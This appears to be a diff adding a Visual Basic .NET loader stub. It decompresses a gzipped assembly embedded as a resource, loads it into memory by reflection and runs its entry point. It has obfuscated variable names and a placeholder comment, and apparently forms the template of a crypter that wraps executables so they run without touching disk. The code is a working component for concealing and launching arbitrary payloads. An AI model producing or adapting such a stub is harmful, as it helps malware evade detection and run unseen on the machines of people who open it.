@@ -1,0 +1,51 @@
+Option Explicit Off
+Option Strict Off
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Text
+Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Windows.Forms
+Imports System.IO
+Imports System.CodeDom.Compiler
+'AssemblyCodes
+Public Class B
+	Shared Sub Main()
+		Dim R As New Resources.ResourceManager("C", Assembly.GetExecutingAssembly)
+		RInvoke(Decompress(R.GetObject("F")))
+	End Sub
+	Public Shared Function RInvoke(ByVal bytes As Byte()) As Boolean
+        Dim vr1 As New Threading.Thread(AddressOf vr0)
+        vr1.SetApartmentState(Threading.ApartmentState.STA)
+        vr1.Start(bytes)
+    End Function
+    Private Shared Sub vr0(ByVal vr0 As Object)
+        Dim vr19 As Reflection.MethodInfo = Reflection.Assembly.Load(DirectCast(vr0, Byte())).EntryPoint
+        If vr19.GetParameters.Length = 1 Then
+            vr19.Invoke(Nothing, New Object() {New String() {}})
+        Else
+            vr19.Invoke(Nothing, Nothing)
+        End If
+    End Sub
+	Shared Function Decompress(ByVal Buffer() As Byte) As Byte()
+        Using A As IO.MemoryStream = New IO.MemoryStream(Buffer)
+            Using B As IO.MemoryStream = New IO.MemoryStream
+                Using C As IO.Compression.GZipStream = _
+                New IO.Compression.GZipStream(A, IO.Compression.CompressionMode.Decompress)
+                    Dim D As Integer = &H3E8
+                    Dim E As Byte() = New Byte(((D - 1) + 1) - 1) {}
+                    Dim F As Integer = -1
+                    F = C.Read(E, 0, E.Length)
+                    Do While (F > 0)
+                        B.Write(E, 0, F)
+                        F = C.Read(E, 0, D)
+                    Loop
+                    Buffer = B.ToArray
+                End Using
+            End Using
+        End Using
+        Return Buffer
+    End Function
+End Class
